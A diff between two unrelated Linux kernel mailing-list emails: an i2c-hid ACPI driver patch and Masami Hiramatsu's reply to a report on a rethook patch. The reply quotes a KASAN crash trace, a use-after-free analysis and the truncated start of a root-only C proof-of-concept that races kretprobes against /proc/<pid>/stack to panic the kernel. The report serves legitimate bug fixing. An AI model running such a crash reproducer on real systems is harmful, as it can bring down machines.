@@ -1,393 +1,347 @@
-Received: from xmbghk7.mail.qq.com (xmbghk7.mail.qq.com [43.163.128.48])
+Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4127E3E92BB
-	for <sashiko-reviews@lists.linux.dev>; Fri, 12 Jun 2026 11:45:21 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=43.163.128.48
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C8CA0384CF7;
+	Fri, 12 Jun 2026 12:20:16 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1781264725; cv=none; b=MhmPx9kNe4sjJTscFEFv/+Ga3Dx5uW+EKEghJ+1jodBBmAxi+nLclMhpL+lttZJxtSelylnJAt6wLsCM77aReV6JnNbFUg61Zsbf3FtRY+3qQo8s3v3uR6/YPLIcHVUKMzaAoofnhC0XIgfFXGbFLsBFZCEQoEiI2mCQd/ZdSr0=
+	t=1781266819; cv=none; b=oCDf17OTEKCVWSy4mbNCwgv73dNeda1na+EbRKqv1CAgMndvcp6+SP2GSUxoZRn63iPPQWEWB3xGnTTz88IldrzMdHnWg4ykXfpnlODdAMUpRCwzPFvj0tmgt5fTlI92Vi3wzeeBawMsOkEY5DrG4wXFwFYOxQIUrH5F0nUQ4Hg=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1781264725; c=relaxed/simple;
-	bh=YHCetUFKyTss09xW5VDxuGuLsDko3ogkrYs9ayHWD/A=;
-	h=Message-ID:From:To:Cc:Subject:Date:In-Reply-To:References:
-	 MIME-Version:Content-Type; b=G23sTfS+MBZGbp+CS/cGNRZPofWm2hRajBxei90uo0v7lykLx8eRIEAkAN8GUO1VzYqcAU7YbqHdZT/FszGbncrubLrHeTFUNJgM4nYEddIHa2uoBobUiIB4jmrIoFeoQpNEcUx3MMyDAiyg/h+Lhl9i3CDwWaq9h82RezBaa04=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=Red54.com; spf=pass smtp.mailfrom=red54.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=d4H0tbD6; arc=none smtp.client-ip=43.163.128.48
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=Red54.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=red54.com
+	s=arc-20240116; t=1781266819; c=relaxed/simple;
+	bh=Ralya6ZghOGBaQNOQcoxOdoPaROIGOw64SjdTXUl6iI=;
+	h=Date:From:To:Cc:Subject:Message-Id:In-Reply-To:References:
+	 Mime-Version:Content-Type; b=RlGM653Y3rjTOnISyJfhVAvJuL17ftg3RBoKfplMQQfbVk7CIuygPNswsb/hN1q/u5WUgGzbE7LVBpB5eLF17noj4qey6NoIuR0jEt3M+2HuSJMVgxvpXQgf7KnYjpetGduc6nNkmgH30TDw5zJ9BuWDdIc8FHR+Wp57zEQ+e3k=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=QuNrEegg; arc=none smtp.client-ip=100.103.45.18
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="d4H0tbD6"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
-	t=1781264716; bh=UsA8T0fLx08Da1yDKZdimxWsgFqC8YyauanrqJW9xO4=;
-	h=From:To:Cc:Subject:Date:In-Reply-To:References;
-	b=d4H0tbD6nA6yNSf4aWPSg85cmJLAKv/wr9YZUtQGM/2tgZ0Oqt//C5CeIyDkVzw7S
-	 WV30fPiCTtNCgUjN1GS8xk/R0/xUOZjDEa8fTm5/KgGNbbkTZHGgNHfUkw3qlKkQa0
-	 hgZysrDfVbQdvSw2Zs+wsoNhRLMAEC8cO8mWxHE4=
-Received: from mail.red54.com ([139.99.8.57])
-	by newxmesmtplogicsvrszb51-0.qq.com (NewEsmtp) with SMTP
-	id B3A04426; Fri, 12 Jun 2026 19:44:58 +0800
-X-QQ-mid: xmsmtpt1781264698tbgo9ri89
-Message-ID: <tencent_8AE8ED913FEC8151B4BA3D85D6BB7F3ACF08@qq.com>
-X-QQ-XMAILINFO: NCmjBvJFq6XNqJMJwM4KOPxdioVH1gUXui5vwHIq+lk2OTsq/mYftyPxJcoyyP
-	 ItKPP+cwM7zUs6KI4+Ni2FPEEw9grUpVCazQf6seZufVcZJd556SSaIKyYVDQ5NeRTj8ZemSNrus
-	 FAIDA3G4mkAboTApHGn3Mn+z7lOdwjLL9lW6CikSAwNrKkxklPIWKW4NbY84sm0D0EKqpzZwIrSz
-	 YHwd2XSXUA5TKfAzDrK8sqaxE5O25d6KRGMTG3B4Zxr3h/a/xxRE/DOCUx69yJyVR/B/sZsx524/
-	 l+bGRb3E8CETq6hc0y/HmZ4etJOEzlYJ4bHhVFddTD2mbJN7nEJRreLZsXHqVuigZEYi/CL5hNr4
-	 tWDCaUJsoLxA79A5iU7+Nq18Fkiz00+/hP3h825gvYIhpgpwS22r+XQosJD8J7Z5ko0pTTJb0C2H
-	 qpdTSWxjhFzcG84LL2FMY7sGTJ8J1rMXh5C6TgfqOehrzQmAGHqquO8bG/nmSXFQJtEFq+SAMwpX
-	 yx8aUIFxeucZ+BE7/L5pY193GKHQ3c8J8FREdQnLhNct+p8nKwtINAkUJ0mxLueCNYtJIk3YnzIJ
-	 9tUKqHIM7bxqpMMf9+Esv306OWkXFxC545HFRMYuJSf6BNulhzcZiN0ubUJAsIobPipaEzhYpAsx
-	 k2FYwa1r7K4RJPxtbaDjwA1CaRCqm6Q4eeAr5flfBksO33z1BNAQuwIY7llla6rEj4SosipRW+LZ
-	 fWw5DboThUOQPK4B6DxoU/LUzYTdowq0km4YAi8YEd64gZ05xwHaPSnMMstPvYzR6Alg9tvtnqnZ
-	 nJUalYMSw9yIqzHnjwB8Pl4GuPPwkES/KZ24eiPR/5G9eAoifXdl7fj+hxTL1rU/dLYg/H7AwPEx
-	 V8o8/d2b8pl32f10TzcEOE4jiWQLo7oEFvxQAZEWlvVGr16mN7qDz+D6gcvWJFgAg7suDXAOcXJh
-	 2Ig5zzbzF/7YLS4sRtNPLb+nS7DFJwNfq1kR47wA2NHKzbUIPnvAuc2dMo6aYB7xIS+zuQTAI52J
-	 99WIxCJji0OK3J8M4YzdlZvZcidaKqj6nu2S/gr34Tu88gQZ6MSKN6hXEmdrAz1QZoaCd4tA==
-X-QQ-XMRINFO: Nq+8W0+stu50tPAe92KXseR0ZZmBTk3gLg==
-Sender: yeking@red54.com
-From: =?UTF-8?q?=E8=B0=A2=E8=87=B4=E9=82=A6=20=28XIE=20Zhibang=29?= <Yeking@Red54.com>
-To: linux-input@vger.kernel.org,
-	hansg@kernel.org,
-	dmitry.torokhov@gmail.com,
-	bentiss@kernel.org,
-	sashiko-bot@kernel.org
-Cc: sashiko-reviews@lists.linux.dev,
-	=?UTF-8?q?=E8=B0=A2=E8=87=B4=E9=82=A6=20=28XIE=20Zhibang=29?= <Yeking@Red54.com>,
-	Jiri Kosina <jikos@kernel.org>,
-	"Mario Limonciello (AMD)" <superm1@kernel.org>,
-	Douglas Anderson <dianders@chromium.org>,
-	linux-kernel@vger.kernel.org
-Subject: [PATCH v5] HID: i2c-hid: Refactor _DSM helper and add i2c-hid-acpi-prp0001 driver
-Date: Fri, 12 Jun 2026 10:38:18 +0000
-X-OQ-MSGID: <20260612103818.151060-1-Yeking@Red54.com>
-X-Mailer: git-send-email 2.43.0
-In-Reply-To: <20260609110608.3F4C21F00898@smtp.kernel.org>
-References: <20260609110608.3F4C21F00898@smtp.kernel.org>
+	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="QuNrEegg"
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 69F8F1F000E9;
+	Fri, 12 Jun 2026 12:20:14 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
+	s=k20260515; t=1781266816;
+	bh=kUCBpwSNXyGDiawWxxm02Igm2sniJToSNoDs2v9eGn0=;
+	h=Date:From:To:Cc:Subject:In-Reply-To:References;
+	b=QuNrEegg+4Z6XvM91l3Z/kFVZ4dCjGWCTLVSSWYAwYJrTNWbBANi8sz91j3p3Ir3j
+	 tTkegCshvaPuj+YCb41aRv1FrlWljOli/VWRc8F+aMD+Bunq5BJp5UZ9GXrMlWOmXo
+	 KTsDtAwVd3sgY7fgcb/O9qywxgkXSchPCcl73ClJZEsp0rWNDzLzFbnYH9F397+jMm
+	 J99MqO8RW8w3OVVy68XozKc22Nenjnszxbmt+UJtYoLcIyzQos203bk40mCvRj/YfN
+	 QJ324AgqyDnOFEdH1wbm3JyrbnXA+5ZX49JqicMowZMkJjc7+8HmVrijuG5WyJJbEs
+	 0H0kwtOhsOhlA==
+Date: Fri, 12 Jun 2026 21:20:12 +0900
+From: Masami Hiramatsu (Google) <mhiramat@kernel.org>
+To: XIAO WU <xiaowu.417@qq.com>
+Cc: sashiko-reviews@lists.linux.dev, Petr Mladek <pmladek@suse.com>, Peter
+ Zijlstra <peterz@infradead.org>, Tengda Wu <wutengda@huaweicloud.com>,
+ Mathieu Desnoyers <mathieu.desnoyers@efficios.com>, Alexei Starovoitov
+ <ast@kernel.org>, Steven Rostedt <rostedt@goodmis.org>,
+ linux-kernel@vger.kernel.org, linux-trace-kernel@vger.kernel.org,
+ live-patching@vger.kernel.org
+Subject: Re: [PATCH v4] rethook: Remove the running task check in
+ rethook_find_ret_addr()
+Message-Id: <20260612212012.b1e0eaa4b3ba1e58afe11fa2@kernel.org>
+In-Reply-To: <tencent_3D17DC5BE32C8A51D938AF50F221321F6206@qq.com>
+References: <20260610013658.1837963-1-wutengda@huaweicloud.com>
+	<20260610015032.4BFAA1F00893@smtp.kernel.org>
+	<tencent_3D17DC5BE32C8A51D938AF50F221321F6206@qq.com>
+X-Mailer: Sylpheed 3.8.0beta1 (GTK+ 2.24.33; x86_64-pc-linux-gnu)
 Precedence: bulk
 X-Mailing-List: sashiko-reviews@lists.linux.dev
 List-Id: <sashiko-reviews.lists.linux.dev>
 List-Subscribe: <mailto:sashiko-reviews+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:sashiko-reviews+unsubscribe@lists.linux.dev>
-MIME-Version: 1.0
+Mime-Version: 1.0
 Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: 8bit
 
-Move the _DSM call that gets the HID descriptor address from
-i2c-hid-acpi.c into i2c-hid-acpi.h as a static inline so both the ACPI
-and the new PRP0001 driver can use it. While refactoring, move the
-blacklist check and the _DSM call to the top of probe() to avoid a
-pointless alloc when the device is blacklisted or does not implement the
-_DSM.
+On Thu, 11 Jun 2026 23:53:36 +0800
+XIAO WU <xiaowu.417@qq.com> wrote:
 
-Some devices, for example the Lenovo KaiTian N60d and Inspur CP300L3,
-are declared with _HID "PRP0001" and _DSD compatible "hid-over-i2c" but
-lack "hid-descr-addr" from the _DSD and provide the HID descriptor
-address only through an ACPI _DSM. The OF driver fails to probe them
-because it requires hid-descr-addr. Add a new driver that handles these
-devices by calling the shared _DSM helper.
+> Hi Tengda,
+> 
+> Sashiko [1] reviewed this patch and found that removing the
+> task_is_running() check exposes stack unwinders to real crashes — not
+> just "invalid information."  A PoC confirms this: a KASAN panic triggers
+> within seconds when /proc/<pid>/stack reads the stack of a task that is
+> concurrently running a kretprobe.
 
-Fixes: b33752c30023 ("HID: i2c-hid: Reorganize so ACPI and OF are separate modules")
-Signed-off-by: 谢致邦 (XIE Zhibang) <Yeking@Red54.com>
----
-v2: Name the unused parameter and document why
-acpi_device_fix_up_power() is skipped.
-v3: Add a dev_warn() asking users to contact vendors for firmware
-updates, and use existing locals in devm_kzalloc() and
-acpi_device_fix_up_power().
-v4: Double the power-up delay from 250ms to 500ms.
-v5: Document why of_match_ptr() on the of_match_table is safe when
-CONFIG_OF=n.
+Hmm, why /proc/<pid>/stack unwind stack so unreliable way...
+That should stop the target process, because it is exposed to
+userspace. Thus it should work as safe as possible.
 
- drivers/hid/i2c-hid/Kconfig                |  18 ++++
- drivers/hid/i2c-hid/Makefile               |   1 +
- drivers/hid/i2c-hid/i2c-hid-acpi-prp0001.c | 104 +++++++++++++++++++++
- drivers/hid/i2c-hid/i2c-hid-acpi.c         |  52 +++--------
- drivers/hid/i2c-hid/i2c-hid-acpi.h         |  32 +++++++
- 5 files changed, 169 insertions(+), 38 deletions(-)
- create mode 100644 drivers/hid/i2c-hid/i2c-hid-acpi-prp0001.c
- create mode 100644 drivers/hid/i2c-hid/i2c-hid-acpi.h
+Anyway, thanks for reporting with the test program.
 
-diff --git a/drivers/hid/i2c-hid/Kconfig b/drivers/hid/i2c-hid/Kconfig
-index e8d51f410cc1..7db8b2abff78 100644
---- a/drivers/hid/i2c-hid/Kconfig
-+++ b/drivers/hid/i2c-hid/Kconfig
-@@ -22,6 +22,24 @@ config I2C_HID_ACPI
- 	  will be called i2c-hid-acpi.  It will also build/depend on the
- 	  module i2c-hid.
- 
-+config I2C_HID_ACPI_PRP0001
-+	tristate "Driver for PRP0001 devices missing hid-descr-addr"
-+	depends on ACPI
-+	depends on DRM || !DRM
-+	select I2C_HID_CORE
-+	help
-+	  Say Y here if you want support for I2C HID touchpads that
-+	  are declared with _HID "PRP0001" and _DSD compatible
-+	  "hid-over-i2c" but lack the "hid-descr-addr" property from
-+	  the _DSD. The HID descriptor address is instead provided
-+	  through an ACPI _DSM. Known affected devices include the
-+	  Lenovo KaiTian N60d and Inspur CP300L3.
-+
-+	  If unsure, say N.
-+
-+	  This support is also available as a module. If so, the
-+	  module will be called i2c-hid-acpi-prp0001.
-+
- config I2C_HID_OF
- 	tristate "HID over I2C transport layer Open Firmware driver"
- 	# No "depends on OF" because this can also be used for manually
-diff --git a/drivers/hid/i2c-hid/Makefile b/drivers/hid/i2c-hid/Makefile
-index 55bd5e0f35af..da420c1a8ec6 100644
---- a/drivers/hid/i2c-hid/Makefile
-+++ b/drivers/hid/i2c-hid/Makefile
-@@ -9,6 +9,7 @@ i2c-hid-objs					=  i2c-hid-core.o
- i2c-hid-$(CONFIG_DMI)				+= i2c-hid-dmi-quirks.o
- 
- obj-$(CONFIG_I2C_HID_ACPI)			+= i2c-hid-acpi.o
-+obj-$(CONFIG_I2C_HID_ACPI_PRP0001)		+= i2c-hid-acpi-prp0001.o
- obj-$(CONFIG_I2C_HID_OF)			+= i2c-hid-of.o
- obj-$(CONFIG_I2C_HID_OF_ELAN)			+= i2c-hid-of-elan.o
- obj-$(CONFIG_I2C_HID_OF_GOODIX)			+= i2c-hid-of-goodix.o
-diff --git a/drivers/hid/i2c-hid/i2c-hid-acpi-prp0001.c b/drivers/hid/i2c-hid/i2c-hid-acpi-prp0001.c
-new file mode 100644
-index 000000000000..05469d220c39
---- /dev/null
-+++ b/drivers/hid/i2c-hid/i2c-hid-acpi-prp0001.c
-@@ -0,0 +1,104 @@
-+// SPDX-License-Identifier: GPL-2.0-only
-+/*
-+ * HID over I2C driver for PRP0001 devices missing hid-descr-addr
-+ *
-+ * Some devices, for example the Lenovo KaiTian N60d and Inspur CP300L3, use
-+ * _HID "PRP0001" with _DSD compatible "hid-over-i2c" but lack "hid-descr-addr"
-+ * from the _DSD. The HID descriptor address is provided only through an ACPI
-+ * _DSM. The TPD0 node in the DSDT shows _DSM Function 1 returning 0x20.
-+ *
-+ * Copyright (C) 2026 谢致邦 (XIE Zhibang) <Yeking@Red54.com>
-+ */
-+
-+#include <linux/delay.h>
-+#include <linux/device.h>
-+#include <linux/i2c.h>
-+#include <linux/module.h>
-+#include <linux/of.h>
-+
-+#include "i2c-hid.h"
-+#include "i2c-hid-acpi.h"
-+
-+static int i2c_hid_acpi_prp0001_power_up(struct i2chid_ops *ops)
-+{
-+	/* give the device time to power up */
-+	msleep(500);
-+	return 0;
-+}
-+
-+static struct i2chid_ops i2c_hid_acpi_prp0001_ops = {
-+	.power_up = i2c_hid_acpi_prp0001_power_up,
-+	/*
-+	 * No .restore_sequence needed: the _DSM on these devices returns a
-+	 * constant (0x20) with no side effects, unlike some PNP0C50 _DSM
-+	 * implementations that switch the hardware between PS/2 and I2C modes.
-+	 */
-+};
-+
-+static int i2c_hid_acpi_prp0001_probe(struct i2c_client *client)
-+{
-+	struct device *dev = &client->dev;
-+	struct acpi_device *adev;
-+	u16 hid_descriptor_address;
-+	int ret;
-+
-+	/* If hid-descr-addr is present, let i2c-hid-of handle it */
-+	if (device_property_present(dev, "hid-descr-addr"))
-+		return -ENODEV;
-+
-+	adev = ACPI_COMPANION(dev);
-+	if (!adev)
-+		return -ENODEV;
-+
-+	ret = i2c_hid_acpi_get_descriptor(adev);
-+	if (ret < 0)
-+		return ret;
-+	dev_warn(dev,
-+		 "hid-descr-addr device property NOT found, using ACPI _DSM fallback. Contact vendor for firmware update!\n");
-+	hid_descriptor_address = ret;
-+
-+	/*
-+	 * No acpi_device_fix_up_power() needed: TPD0 has no _PS0, _PS3, _PSC
-+	 * or _PRx methods and follows I2C bus power.
-+	 */
-+	return i2c_hid_core_probe(client, &i2c_hid_acpi_prp0001_ops,
-+				  hid_descriptor_address, 0);
-+}
-+
-+static const struct of_device_id i2c_hid_acpi_prp0001_of_match[] = {
-+	{ .compatible = "hid-over-i2c" },
-+	{},
-+};
-+MODULE_DEVICE_TABLE(of, i2c_hid_acpi_prp0001_of_match);
-+
-+static const struct i2c_device_id i2c_hid_acpi_prp0001_id[] = {
-+	{ .name = "hid-over-i2c" },
-+	{ }
-+};
-+MODULE_DEVICE_TABLE(i2c, i2c_hid_acpi_prp0001_id);
-+
-+static struct i2c_driver i2c_hid_acpi_prp0001_driver = {
-+	.driver = {
-+		.name	= "i2c_hid_acpi_prp0001",
-+		.pm	= &i2c_hid_core_pm,
-+		.probe_type = PROBE_PREFER_ASYNCHRONOUS,
-+		/*
-+		 * of_match_ptr() makes this NULL when CONFIG_OF=n, but that's
-+		 * fine: the I2C id_table with "hid-over-i2c" handles matching
-+		 * via client->name (set by acpi_set_modalias() from the _DSD
-+		 * compatible property).
-+		 */
-+		.of_match_table = of_match_ptr(i2c_hid_acpi_prp0001_of_match),
-+	},
-+
-+	.probe		= i2c_hid_acpi_prp0001_probe,
-+	.remove		= i2c_hid_core_remove,
-+	.shutdown	= i2c_hid_core_shutdown,
-+	.id_table	= i2c_hid_acpi_prp0001_id,
-+};
-+
-+module_i2c_driver(i2c_hid_acpi_prp0001_driver);
-+
-+MODULE_DESCRIPTION("HID over I2C driver for PRP0001 devices missing hid-descr-addr");
-+MODULE_AUTHOR("谢致邦 (XIE Zhibang) <Yeking@Red54.com>");
-+MODULE_LICENSE("GPL");
-diff --git a/drivers/hid/i2c-hid/i2c-hid-acpi.c b/drivers/hid/i2c-hid/i2c-hid-acpi.c
-index abd700a101f4..13f977d6aab6 100644
---- a/drivers/hid/i2c-hid/i2c-hid-acpi.c
-+++ b/drivers/hid/i2c-hid/i2c-hid-acpi.c
-@@ -25,9 +25,9 @@
- #include <linux/kernel.h>
- #include <linux/module.h>
- #include <linux/pm.h>
--#include <linux/uuid.h>
- 
- #include "i2c-hid.h"
-+#include "i2c-hid-acpi.h"
- 
- struct i2c_hid_acpi {
- 	struct i2chid_ops ops;
-@@ -48,39 +48,11 @@ static const struct acpi_device_id i2c_hid_acpi_blacklist[] = {
- 	{ }
- };
- 
--/* HID I²C Device: 3cdff6f7-4267-4555-ad05-b30a3d8938de */
--static guid_t i2c_hid_guid =
--	GUID_INIT(0x3CDFF6F7, 0x4267, 0x4555,
--		  0xAD, 0x05, 0xB3, 0x0A, 0x3D, 0x89, 0x38, 0xDE);
--
--static int i2c_hid_acpi_get_descriptor(struct i2c_hid_acpi *ihid_acpi)
--{
--	struct acpi_device *adev = ihid_acpi->adev;
--	acpi_handle handle = acpi_device_handle(adev);
--	union acpi_object *obj;
--	u16 hid_descriptor_address;
--
--	if (acpi_match_device_ids(adev, i2c_hid_acpi_blacklist) == 0)
--		return -ENODEV;
--
--	obj = acpi_evaluate_dsm_typed(handle, &i2c_hid_guid, 1, 1, NULL,
--				      ACPI_TYPE_INTEGER);
--	if (!obj) {
--		acpi_handle_err(handle, "Error _DSM call to get HID descriptor address failed\n");
--		return -ENODEV;
--	}
--
--	hid_descriptor_address = obj->integer.value;
--	ACPI_FREE(obj);
--
--	return hid_descriptor_address;
--}
--
- static void i2c_hid_acpi_restore_sequence(struct i2chid_ops *ops)
- {
- 	struct i2c_hid_acpi *ihid_acpi = container_of(ops, struct i2c_hid_acpi, ops);
- 
--	i2c_hid_acpi_get_descriptor(ihid_acpi);
-+	i2c_hid_acpi_get_descriptor(ihid_acpi->adev);
- }
- 
- static void i2c_hid_acpi_shutdown_tail(struct i2chid_ops *ops)
-@@ -93,24 +65,28 @@ static void i2c_hid_acpi_shutdown_tail(struct i2chid_ops *ops)
- static int i2c_hid_acpi_probe(struct i2c_client *client)
- {
- 	struct device *dev = &client->dev;
-+	struct acpi_device *adev = ACPI_COMPANION(dev);
- 	struct i2c_hid_acpi *ihid_acpi;
- 	u16 hid_descriptor_address;
- 	int ret;
- 
--	ihid_acpi = devm_kzalloc(&client->dev, sizeof(*ihid_acpi), GFP_KERNEL);
-+	if (acpi_match_device_ids(adev, i2c_hid_acpi_blacklist) == 0)
-+		return -ENODEV;
-+
-+	ret = i2c_hid_acpi_get_descriptor(adev);
-+	if (ret < 0)
-+		return ret;
-+	hid_descriptor_address = ret;
-+
-+	ihid_acpi = devm_kzalloc(dev, sizeof(*ihid_acpi), GFP_KERNEL);
- 	if (!ihid_acpi)
- 		return -ENOMEM;
- 
--	ihid_acpi->adev = ACPI_COMPANION(dev);
-+	ihid_acpi->adev = adev;
- 	ihid_acpi->ops.shutdown_tail = i2c_hid_acpi_shutdown_tail;
- 	ihid_acpi->ops.restore_sequence = i2c_hid_acpi_restore_sequence;
- 
--	ret = i2c_hid_acpi_get_descriptor(ihid_acpi);
--	if (ret < 0)
--		return ret;
--	hid_descriptor_address = ret;
--
--	acpi_device_fix_up_power(ihid_acpi->adev);
-+	acpi_device_fix_up_power(adev);
- 
- 	return i2c_hid_core_probe(client, &ihid_acpi->ops,
- 				  hid_descriptor_address, 0);
-diff --git a/drivers/hid/i2c-hid/i2c-hid-acpi.h b/drivers/hid/i2c-hid/i2c-hid-acpi.h
-new file mode 100644
-index 000000000000..8cebbeebcc23
---- /dev/null
-+++ b/drivers/hid/i2c-hid/i2c-hid-acpi.h
-@@ -0,0 +1,32 @@
-+/* SPDX-License-Identifier: GPL-2.0-only */
-+
-+#ifndef _I2C_HID_ACPI_H
-+#define _I2C_HID_ACPI_H
-+
-+#include <linux/acpi.h>
-+#include <linux/uuid.h>
-+
-+static inline int i2c_hid_acpi_get_descriptor(struct acpi_device *adev)
-+{
-+	/* HID I²C Device: 3cdff6f7-4267-4555-ad05-b30a3d8938de */
-+	static const guid_t i2c_hid_guid =
-+		GUID_INIT(0x3CDFF6F7, 0x4267, 0x4555,
-+			  0xAD, 0x05, 0xB3, 0x0A, 0x3D, 0x89, 0x38, 0xDE);
-+
-+	acpi_handle handle = acpi_device_handle(adev);
-+	union acpi_object *obj;
-+	u16 addr;
-+
-+	obj = acpi_evaluate_dsm_typed(handle, &i2c_hid_guid,
-+				      1, 1, NULL, ACPI_TYPE_INTEGER);
-+	if (!obj) {
-+		acpi_handle_err(handle, "Error _DSM call to get HID descriptor address failed\n");
-+		return -ENODEV;
-+	}
-+
-+	addr = obj->integer.value;
-+	ACPI_FREE(obj);
-+	return addr;
-+}
-+
-+#endif
+> 
+> [1] 
+> https://sashiko.dev/#/patchset/20260610013658.1837963-1-wutengda%40huaweicloud.com
+> 
+>  > diff --git a/kernel/trace/rethook.c b/kernel/trace/rethook.c
+>  > index 5a8bdf88999a..1e7fdebe3cd5 100644
+>  > --- a/kernel/trace/rethook.c
+>  > +++ b/kernel/trace/rethook.c
+>  > @@ -250,9 +251,6 @@ unsigned long rethook_find_ret_addr(struct 
+> task_struct *tsk, unsigned long frame
+>  >      if (WARN_ON_ONCE(!cur))
+>  >          return 0;
+>  >
+>  > -    if (tsk != current && task_is_running(tsk))
+>  > -        return 0;
+>  > -
+>  >      do {
+>  >          ret = __rethook_find_ret_addr(tsk, cur);
+>  >          if (!ret)
+> 
+> The commit message states:
+> 
+>  > The iteration is already safe from crashes because
+>  > unwind_next_frame() holds RCU and rethook_node structures are
+>  > RCU-freed; even if the iteration goes off the rails and returns
+>  > invalid information, it will not crash.
+> 
+> There are two problems with this claim, both reproducible.
+> 
+> **Problem 1: stack-out-of-bounds in unwind_next_frame itself**
+> 
+> The PoC below reliably triggers the following KASAN panic — not in the
+> rethook list traversal, but inside unwind_next_frame():
+> 
+> [ 1833.494623] BUG: KASAN: stack-out-of-bounds in 
+> unwind_next_frame+0x861/0x2080
+> [ 1833.494651] Read of size 2 at addr ffffc90003e6f5f0 by task poc/9854
+> [ 1833.494707] Call Trace:
+> [ 1833.494719]  dump_stack_lvl+0x116/0x1f0
+> [ 1833.494743]  print_report+0xf4/0x600
+> [ 1833.494788]  kasan_report+0xe0/0x110
+> [ 1833.494836]  unwind_next_frame+0x861/0x2080
+> [ 1833.494948]  arch_stack_walk+0x99/0x100
+> [ 1833.495000]  stack_trace_save_tsk+0x16a/0x200
+> [ 1833.495054]  proc_pid_stack+0x173/0x2b0
+> [ 1833.495103]  seq_read_iter+0x519/0x12d0
+> [ 1833.495166]  seq_read+0x3b7/0x590
+> [ 1833.495297]  vfs_read+0x1f5/0xd20
+> [ 1833.495497]  ksys_read+0x135/0x250
+> [ 1833.495549]  do_syscall_64+0x129/0x850
+> [ 1833.495566]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+> [ 1833.498894] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+> 
+> page last free pid 9737 tgid 9737 stack trace:
+>   do_sys_openat2+0xbf/0x260          <-- target task inside kretprobe
+>   __x64_sys_openat+0x179/0x210
+> 
+> This crash has nothing to do with rethook_node lifetimes or RCU.  It
+> happens because the ORC unwinder reads stack memory while the target
+> task concurrently executes a kretprobe trampoline that modifies return
+> addresses.  The unwinder follows corrupted frame data past valid stack
+> boundaries.  RCU protection of rethook_node structures is irrelevant —
+> this crash occurs at the stack frame interpretation level, before any
+> rethook list traversal.
+
+OK, in that case, I think we should not allow list traversal.
+I think without freezing the target task, accessing /proc/<pid>/stack
+is potentially dangerous. Shouldn't we fix this at first?
+
+> 
+> The old task_is_running() check prevented the unwinder from attempting
+> to unwind a running task's stack in the first place.
+> 
+> **Problem 2: use-after-free via rethook_node recycling**
+> 
+> Even if the stack-out-of-bounds above were addressed, a second crash
+> path exists in the rethook list traversal itself.
+> 
+> rethook_recycle() immediately pushes nodes back to the objpool without
+> an RCU grace period:
+> 
+>    kernel/trace/rethook.c:
+>    void rethook_recycle(struct rethook_node *node)
+>    {
+>            ...
+>            objpool_push(node, &node->rethook->pool);
+>    }
+> 
+> Meanwhile, unwind_next_frame() in arch/x86/kernel/unwind_orc.c drops
+> RCU between frames while the cursor (*cur) persists across iterations:
+> 
+>    arch/x86/kernel/unwind_orc.c:
+>    bool unwind_next_frame(...)
+>    {
+>            ...
+>            guard(rcu)();    // RCU held for one frame
+>            ...
+>    }                        // RCU dropped here
+> 
+> When the unwinder calls __rethook_find_ret_addr() in the next frame
+> iteration, it does:
+> 
+>    struct llist_node *first = tsk->rethooks.first;
+>    ...
+>    *cur = first;
+>    ...
+>    node = node->next;       // node may have been recycled
+> 
+> If the target task returns from a probed function between frames, its
+> rethook_node is recycled and can be instantly reallocated to another
+> task.  The unwinder's stale cursor then dereferences a freed pointer,
+> leading to use-after-free.
+
+
+OK, this is still real problem. We should use call_rcu() to return
+the object back to objpool.
+
+Thanks!
+
+> 
+> ## Reproducer
+> 
+> The PoC sets up a kretprobe on do_sys_openat2, creates hot-loop threads
+> calling open(), and concurrently reads /proc/<tid>/stack.  The race
+> triggers within seconds (Problem 1 above; Problem 2 may reproduce on
+> kernels without KASAN or with different timing).
+> 
+> Build:  gcc -static -pthread -o poc poc.c
+> Run:    ./poc [runtime_seconds]
+> Needs:  root, CONFIG_KASAN=y
+> 
+> #define _GNU_SOURCE
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <unistd.h>
+> #include <sys/types.h>
+> #include <sys/stat.h>
+> #include <sys/wait.h>
+> #include <sys/syscall.h>
+> #include <sched.h>
+> #include <fcntl.h>
+> #include <errno.h>
+> #include <signal.h>
+> #include <pthread.h>
+> #include <dirent.h>
+> 
+> #define TRACE "/sys/kernel/tracing"
+> 
+> volatile int stop = 0;
+> 
+> static int tfs(const char *f, const char *b)
+> {
+>      char p[256]; int fd, r;
+>      snprintf(p, 256, "%s/%s", TRACE, f);
+>      fd = open(p, O_WRONLY | O_TRUNC);
+>      if (fd < 0) {
+>          system("mount -t tracefs tracefs /sys/kernel/tracing 2>/dev/null");
+>          usleep(50000);
+>          fd = open(p, O_WRONLY | O_TRUNC);
+>      }
+>      if (fd < 0) return -1;
+>      r = write(fd, b, strlen(b));
+>      close(fd);
+>      return r < 0 ? -1 : 0;
+> }
+> 
+> void *hot_thread(void *arg)
+> {
